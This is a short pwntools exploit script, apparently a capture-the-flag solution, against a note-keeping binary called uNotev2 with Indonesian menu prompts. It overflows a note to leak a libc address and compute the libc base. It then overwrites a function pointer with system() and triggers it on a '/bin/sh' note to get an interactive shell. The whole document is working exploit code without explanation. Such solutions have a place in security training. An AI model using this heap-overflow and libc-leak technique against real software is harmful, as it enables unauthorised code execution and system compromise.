from pwn import *

r = remote("127.0.0.1",32777)
# r = process(['./uNotev2'])

libc = ELF("../src/libc.so.6",checksec=False)

libc_puts = libc.symbols['puts']

def tambah(b):
	r.sendline(b"1")
	r.sendlineafter(b"catatan: ",b"16")
	r.sendlineafter(b"catatan: ",b)

def edit(a,b):
	r.sendline(b"2")
	r.sendlineafter(b"indeks: ",a)
	r.sendafter(b"baru: ",b)

def tampil(a):
	r.sendline(b"3")
	r.sendlineafter(b"ditampilkan: ",a)

tambah(b"A"*16)
tambah(b"/bin/sh\x00")
tambah(b"A"*16)
edit(b"0",b'B'*24+b'D'*8)
tampil(b"0")
r.recvuntil(b'D'*8)
leak = u64(r.recvuntil(b'\n',drop=True).ljust(8, b"\x00"))

log.info("Leaked libc address,  puts: "+ hex(leak))

libc.address = leak - libc_puts
libc_system = libc.symbols["system"]

log.info("Leaked libc address,  base: "+ hex(libc.address))
log.info("Leaked libc address,  system: "+ hex(libc_system))

edit(b"0",b'B'*24+b'D'*8+p64(libc_system))
tampil(b"1")
r.interactive()
